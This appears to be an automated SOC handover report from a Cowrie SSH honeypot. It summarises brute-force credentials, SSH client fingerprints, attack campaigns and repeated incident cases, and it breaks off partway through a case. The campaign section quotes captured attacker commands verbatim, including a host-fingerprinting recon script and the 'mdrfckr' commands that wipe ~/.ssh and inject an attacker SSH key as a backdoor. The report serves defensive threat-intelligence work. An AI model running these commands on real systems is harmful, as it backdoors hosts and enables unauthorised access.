# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-08-26 |
| **Generated At** | 2026-08-26T03:09:29Z |
| **Shift Time** | 03:09 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **116** |
| Confirmed Threats | **106** |
| False Positives Filtered | **10** (8.6%) |
| Unique Attacker IPs | **30** |
| Countries of Origin | **17** |
| High Severity Cases | **46** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **70** |
| Malware Samples Analyzed | **2** HIGH · **20** MED · 22 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **54** |
| Unique Credential Pairs | **45** |
| Unique Usernames | **9** |
| Unique Passwords | **40** |
| Successful Auth Pairs | **48** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 19 |
| `ubuntu` | 12 |
| `admin` | 7 |
| `admin1` | 4 |
| `administrator` | 3 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `` | 4 |
| `admin` | 3 |
| `support` | 3 |
| `password` | 2 |
| `123123` | 2 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `root` | `` | 4 |
| `admin` | `admin` | 3 |
| `support` | `support` | 3 |
| `pi` | `abcd1234` | 2 |
| `345gs5662d34` | `345gs5662d34` | 2 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `admin` | `passw0rd` | `80.94.92.234` | 2026-08-26T00:55:38 |
| `admin` | `password` | `80.94.92.234` | 2026-08-26T00:57:20 |
| `admin` | `password1` | `80.94.92.234` | 2026-08-26T00:59:13 |
| `admin` | `qwerty` | `80.94.92.234` | 2026-08-26T01:01:39 |
| `ubuntu` | `'` | `217.60.255.130` | 2026-08-26T01:02:39 |
| `root` | `1Qaz2wsx3e` | `217.60.255.130` | 2026-08-26T01:02:43 |
| `admin1` | `123123` | `80.94.92.234` | 2026-08-26T01:04:43 |
| `admin1` | `12345` | `80.94.92.234` | 2026-08-26T01:06:24 |
| `admin1` | `123456` | `80.94.92.234` | 2026-08-26T01:08:26 |
| `root` | `﻿------fuck------` | `10.0.0.73` | 2026-08-26T01:10:55 |
| `admin1` | `password` | `80.94.92.234` | 2026-08-26T01:10:56 |
| `admin` | `admin` | `138.2.102.66` | 2026-08-26T01:11:12 |
| `ubuntu` | `test12345` | `217.60.255.130` | 2026-08-26T01:12:06 |
| `root` | `Password@1234` | `217.60.255.130` | 2026-08-26T01:12:10 |
| `administrator` | `123123` | `80.94.92.234` | 2026-08-26T01:13:32 |
| `administrator` | `12345` | `80.94.92.234` | 2026-08-26T01:15:15 |
| `administrator` | `123456` | `80.94.92.234` | 2026-08-26T01:16:52 |
| `ubuntu` | `Thanh@123` | `217.60.255.130` | 2026-08-26T01:21:41 |
| `root` | `vps@2025` | `217.60.255.130` | 2026-08-26T01:21:45 |
| `admin` | `admin` | `8.219.220.7` | 2026-08-26T01:25:26 |
| `admin` | `admin` | `130.12.180.51` | 2026-08-26T01:25:26 |
| `ubuntu` | `Media123` | `217.60.255.130` | 2026-08-26T01:30:56 |
| `root` | `System@2025` | `217.60.255.130` | 2026-08-26T01:30:59 |
| `support` | `support` | `176.53.159.196` | 2026-08-26T01:34:32 |
| `pi` | `abcd1234` | `10.0.0.73` | 2026-08-26T01:40:19 |
| `ubuntu` | `iptv@123` | `217.60.255.130` | 2026-08-26T01:40:24 |
| `root` | `Qwert.12345` | `217.60.255.130` | 2026-08-26T01:40:28 |
| `ubuntu` | `Abcxyz@123` | `217.60.255.130` | 2026-08-26T01:49:57 |
| `root` | `Test1234!` | `217.60.255.130` | 2026-08-26T01:50:00 |
| `ubuntu` | `Hoang@123` | `217.60.255.130` | 2026-08-26T01:59:14 |
| `root` | `private` | `217.60.255.130` | 2026-08-26T01:59:17 |
| `nikita` | `12345678` | `104.234.138.25` | 2026-08-26T02:08:32 |
| `345gs5662d34` | `345gs5662d34` | `104.234.138.25` | 2026-08-26T02:08:34 |
| `nikita` | `3245gs5662d34` | `104.234.138.25` | 2026-08-26T02:08:35 |
| `ubuntu` | `Smoker123` | `217.60.255.130` | 2026-08-26T02:08:37 |
| `root` | `Asdf@123` | `217.60.255.130` | 2026-08-26T02:08:42 |
| `support` | `support` | `10.0.0.73` | 2026-08-26T02:10:18 |
| `root` | `123qweASD!@` | `106.75.25.139` | 2026-08-26T02:13:43 |
| `345gs5662d34` | `345gs5662d34` | `106.75.25.139` | 2026-08-26T02:13:48 |
| `root` | `3245gs5662d34` | `106.75.25.139` | 2026-08-26T02:13:50 |
| `ubuntu` | `Optimus@123` | `217.60.255.130` | 2026-08-26T02:18:12 |
| `root` | `Tech@123` | `217.60.255.130` | 2026-08-26T02:18:16 |
| `ubuntu` | `admin@2023` | `217.60.255.130` | 2026-08-26T02:27:32 |
| `root` | `123!P@ssw0rd` | `217.60.255.130` | 2026-08-26T02:27:35 |
| `ubuntu` | `Vv@1234` | `217.60.255.130` | 2026-08-26T02:36:58 |
| `root` | `Web@123` | `217.60.255.130` | 2026-08-26T02:37:02 |
| `ubuntu` | `Afra@123` | `217.60.255.130` | 2026-08-26T02:46:25 |
| `root` | `Qwerty@123` | `217.60.255.130` | 2026-08-26T02:46:29 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **116** |
| Sessions with Fingerprint | **12** |
| Unique HASSH Fingerprints | **12** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 37 |
| Go SSH scanner | 19 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `419da4c91ddb...` | Modern SSH client | 24 | 1 |
| `2ec37a7cc8da...` | Mirai/variant | 11 | 1 |
| `f555226df196...` | Mirai/variant | 3 | 1 |
| `03a80b21afa8...` | Modern SSH client | 3 | 1 |
| `f1e5e9d24e5e...` | Mirai/variant | 2 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `419da4c91ddb...` | libssh | 24 | 1 | Modern SSH client |
| `2ec37a7cc8da...` | Go SSH scanner | 11 | 1 | Mirai/variant |
| `95420f9d932d...` | libssh | 6 | 2 | — |
| `f555226df196...` | libssh | 3 | 1 | Mirai/variant |
| `03a80b21afa8...` | libssh | 3 | 1 | Modern SSH client |
| `f1e5e9d24e5e...` | Go SSH scanner | 2 | 1 | Mirai/variant |
| `eff4c24daffc...` | Go SSH scanner | 2 | 1 | Modern SSH client |
| `9052c4ab4164...` | Go SSH scanner | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **4** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Recon Loader Script** | 🟡 MEDIUM | 11 | 1 | `T1082, T1592, T1078, T1083` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 2 | 2 | `T1021.004, T1078, T1070, T1140` |

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una
```
```
uname -s -v -n -m 2 > /dev/null
```
```
/bin/uname -s -v -n -m 2 > /dev/null
```
```
/usr/bin/uname -s -v -n -m 2 > /dev/null
```
```
busybox uname -s -v -n -m 2 > /dev/null
```
Source IPs: `80.94.92.234`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `104.234.138.25`, `106.75.25.139`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **30** |
| Unique ASNs | **27** |
| High-Risk ASNs | **22** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS63949` | Akamai Connected Cloud | 2 | HIGH |
| `AS396982` | Google LLC | 2 | LOW |
| `AS269946` | BOOM SOLUTIONS C.A. | 2 | LOW |
| `AS14061` | DigitalOcean, LLC | 1 | HIGH |
| `AS45102` | Alibaba (US) Technology Co., Ltd. | 1 | HIGH |
| `AS137718` | Beijing Volcano Engine Technology Co., Ltd. | 1 | HIGH |
| `AS47890` | UNMANAGED LTD | 1 | HIGH |
| `AS9318` | SK Broadband Co Ltd | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (46)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-17faa376f6ec

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-08-26 00:55 |
| **Last Seen** | 2026-08-26 00:55 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-26 00:55:36` | `cowrie.session.connect` |
| `2026-08-26 00:55:36` | `cowrie.client.version` |
| `2026-08-26 00:55:37` | `cowrie.client.kex` |
| `2026-08-26 00:55:38` | `cowrie.login.success` |
| `2026-08-26 00:55:39` | `cowrie.session.params` |
| `2026-08-26 00:55:39` | `cowrie.command.input` |
| `2026-08-26 00:55:39` | `cowrie.command.input` |
| `2026-08-26 00:55:39` | `cowrie.command.input` |
| `2026-08-26 00:55:39` | `cowrie.command.input` |
| `2026-08-26 00:55:39` | `cowrie.command.input` |
| `2026-08-26 00:55:39` | `cowrie.command.success` |
| `2026-08-26 00:55:39` | `cowrie.command.input` |
| `2026-08-26 00:55:39` | `cowrie.command.input` |
| `2026-08-26 00:55:39` | `cowrie.command.input` |
| `2026-08-26 00:55:39` | `cowrie.command.input` |
| `2026-08-26 00:55:40` | `cowrie.log.closed` |
| `2026-08-26 00:55:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-04e35a84e260

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-08-26 00:57 |
| **Last Seen** | 2026-08-26 00:57 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-26 00:57:18` | `cowrie.session.connect` |
| `2026-08-26 00:57:18` | `cowrie.client.version` |
| `2026-08-26 00:57:18` | `cowrie.client.kex` |
| `2026-08-26 00:57:20` | `cowrie.login.success` |
| `2026-08-26 00:57:21` | `cowrie.session.params` |
| `2026-08-26 00:57:21` | `cowrie.command.input` |
| `2026-08-26 00:57:21` | `cowrie.command.input` |
| `2026-08-26 00:57:22` | `cowrie.command.input` |
| `2026-08-26 00:57:22` | `cowrie.command.input` |
| `2026-08-26 00:57:22` | `cowrie.command.input` |
| `2026-08-26 00:57:22` | `cowrie.command.success` |
| `2026-08-26 00:57:22` | `cowrie.command.input` |
| `2026-08-26 00:57:22` | `cowrie.command.input` |
| `2026-08-26 00:57:22` | `cowrie.command.input` |
| `2026-08-26 00:57:22` | `cowrie.command.input` |
| `2026-08-26 00:57:22` | `cowrie.log.closed` |
| `2026-08-26 00:57:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-702f76339139

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-08-26 00:59 |
| **Last Seen** | 2026-08-26 00:59 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-26 00:59:11` | `cowrie.session.connect` |
| `2026-08-26 00:59:12` | `cowrie.client.version` |
| `2026-08-26 00:59:12` | `cowrie.client.kex` |
| `2026-08-26 00:59:13` | `cowrie.login.success` |
| `2026-08-26 00:59:14` | `cowrie.session.params` |
| `2026-08-26 00:59:14` | `cowrie.command.input` |
| `2026-08-26 00:59:14` | `cowrie.command.input` |
| `2026-08-26 00:59:14` | `cowrie.command.input` |
| `2026-08-26 00:59:14` | `cowrie.command.input` |
| `2026-08-26 00:59:14` | `cowrie.command.input` |
| `2026-08-26 00:59:14` | `cowrie.command.success` |
| `2026-08-26 00:59:14` | `cowrie.command.input` |
| `2026-08-26 00:59:14` | `cowrie.command.input` |
| `2026-08-26 00:59:14` | `cowrie.command.input` |
| `2026-08-26 00:59:14` | `cowrie.command.input` |
| `2026-08-26 00:59:14` | `cowrie.log.closed` |
| `2026-08-26 00:59:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f7d3172040bc

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-08-26 01:01 |
| **Last Seen** | 2026-08-26 01:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-26 01:01:39` | `cowrie.session.connect` |
| `2026-08-26 01:01:39` | `cowrie.client.version` |
| `2026-08-26 01:01:39` | `cowrie.client.kex` |
| `2026-08-26 01:01:39` | `cowrie.login.success` |
| `2026-08-26 01:01:40` | `cowrie.session.params` |
| `2026-08-26 01:01:40` | `cowrie.command.input` |
| `2026-08-26 01:01:40` | `cowrie.command.input` |
| `2026-08-26 01:01:40` | `cowrie.command.input` |
| `2026-08-26 01:01:40` | `cowrie.command.input` |
| `2026-08-26 01:01:40` | `cowrie.command.input` |
| `2026-08-26 01:01:40` | `cowrie.command.success` |
| `2026-08-26 01:01:40` | `cowrie.command.input` |
| `2026-08-26 01:01:40` | `cowrie.command.input` |
| `2026-08-26 01:01:40` | `cowrie.command.input` |
| `2026-08-26 01:01:40` | `cowrie.command.input` |
| `2026-08-26 01:01:40` | `cowrie.log.closed` |
| `2026-08-26 01:01:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b06b57e7f712

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-26 01:02 |
| **Last Seen** | 2026-08-26 01:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-26 01:02:38` | `cowrie.session.connect` |
| `2026-08-26 01:02:38` | `cowrie.client.version` |
| `2026-08-26 01:02:38` | `cowrie.client.kex` |
| `2026-08-26 01:02:39` | `cowrie.login.success` |
| `2026-08-26 01:02:39` | `cowrie.direct-tcpip.request` |
| `2026-08-26 01:02:39` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-26 01:02:39` | `cowrie.direct-tcpip.data` |
| `2026-08-26 01:02:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b121dd2eeeda

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-26 01:02 |
| **Last Seen** | 2026-08-26 01:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-26 01:02:42` | `cowrie.session.connect` |
| `2026-08-26 01:02:42` | `cowrie.client.version` |
| `2026-08-26 01:02:42` | `cowrie.client.kex` |
| `2026-08-26 01:02:43` | `cowrie.login.success` |
| `2026-08-26 01:02:43` | `cowrie.direct-tcpip.request` |
| `2026-08-26 01:02:43` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-26 01:02:43` | `cowrie.direct-tcpip.data` |
| `2026-08-26 01:02:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5da0639553d5

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-08-26 01:04 |
| **Last Seen** | 2026-08-26 01:04 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-26 01:04:42` | `cowrie.session.connect` |
| `2026-08-26 01:04:42` | `cowrie.client.version` |
| `2026-08-26 01:04:42` | `cowrie.client.kex` |
| `2026-08-26 01:04:43` | `cowrie.login.success` |
| `2026-08-26 01:04:44` | `cowrie.session.params` |
| `2026-08-26 01:04:44` | `cowrie.command.input` |
| `2026-08-26 01:04:44` | `cowrie.command.input` |
| `2026-08-26 01:04:44` | `cowrie.command.input` |
| `2026-08-26 01:04:44` | `cowrie.command.input` |
| `2026-08-26 01:04:44` | `cowrie.command.input` |
| `2026-08-26 01:04:44` | `cowrie.command.success` |
| `2026-08-26 01:04:44` | `cowrie.command.input` |
| `2026-08-26 01:04:44` | `cowrie.command.input` |
| `2026-08-26 01:04:44` | `cowrie.command.input` |
| `2026-08-26 01:04:44` | `cowrie.command.input` |
| `2026-08-26 01:04:44` | `cowrie.log.closed` |
| `2026-08-26 01:04:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a2653b3dd204

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-08-26 01:06 |
| **Last Seen** | 2026-08-26 01:06 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-26 01:06:22` | `cowrie.session.connect` |
| `2026-08-26 01:06:23` | `cowrie.client.version` |
| `2026-08-26 01:06:23` | `cowrie.client.kex` |
| `2026-08-26 01:06:24` | `cowrie.login.success` |
| `2026-08-26 01:06:25` | `cowrie.session.params` |
| `2026-08-26 01:06:25` | `cowrie.command.input` |
| `2026-08-26 01:06:25` | `cowrie.command.input` |
| `2026-08-26 01:06:25` | `cowrie.command.input` |
| `2026-08-26 01:06:25` | `cowrie.command.input` |
| `2026-08-26 01:06:25` | `cowrie.command.input` |
| `2026-08-26 01:06:25` | `cowrie.command.success` |
| `2026-08-26 01:06:25` | `cowrie.command.input` |
| `2026-08-26 01:06:25` | `cowrie.command.input` |
| `2026-08-26 01:06:25` | `cowrie.command.input` |
| `2026-08-26 01:06:25` | `cowrie.command.input` |
| `2026-08-26 01:06:26` | `cowrie.log.closed` |
| `2026-08-26 01:06:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dc034f5c041e

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-08-26 01:08 |
| **Last Seen** | 2026-08-26 01:08 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-26 01:08:25` | `cowrie.session.connect` |
| `2026-08-26 01:08:25` | `cowrie.client.version` |
| `2026-08-26 01:08:25` | `cowrie.client.kex` |
| `2026-08-26 01:08:26` | `cowrie.login.success` |
| `2026-08-26 01:08:27` | `cowrie.session.params` |
| `2026-08-26 01:08:27` | `cowrie.command.input` |
| `2026-08-26 01:08:27` | `cowrie.command.input` |
| `2026-08-26 01:08:27` | `cowrie.command.input` |
| `2026-08-26 01:08:27` | `cowrie.command.input` |
| `2026-08-26 01:08:27` | `cowrie.command.input` |
| `2026-08-26 01:08:27` | `cowrie.command.success` |
| `2026-08-26 01:08:27` | `cowrie.command.input` |
| `2026-08-26 01:08:27` | `cowrie.command.input` |
| `2026-08-26 01:08:27` | `cowrie.command.input` |
